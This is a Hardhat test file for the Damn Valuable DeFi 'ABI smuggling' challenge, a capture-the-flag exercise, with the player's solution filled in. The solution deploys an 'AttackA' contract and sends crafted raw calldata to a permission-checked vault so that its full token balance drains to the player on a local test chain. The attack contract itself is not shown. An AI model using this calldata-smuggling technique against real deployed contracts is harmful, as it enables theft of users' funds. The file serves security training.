const { ethers } = require('hardhat'); 
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    let attack;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        // 0x85fb709d == sweepFunds(address,address)
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        // 0xd9caed12 == withdraw(address,address,uint256)
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        const AttackFactory = await ethers.getContractFactory('AttackA', player);
        attack = await AttackFactory.connect(player).deploy(vault.address,token.address,player.address);

        let param = await attack.connect(player).callStatic.kek();
        //console.log("param = ", param);
        await player.sendTransaction({to: vault.address, data: param});
        //console.log("player balance = ", (await token.balanceOf(player.address)).div(10n**18n));
        await token.connect(player).transfer(recovery.address,VAULT_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
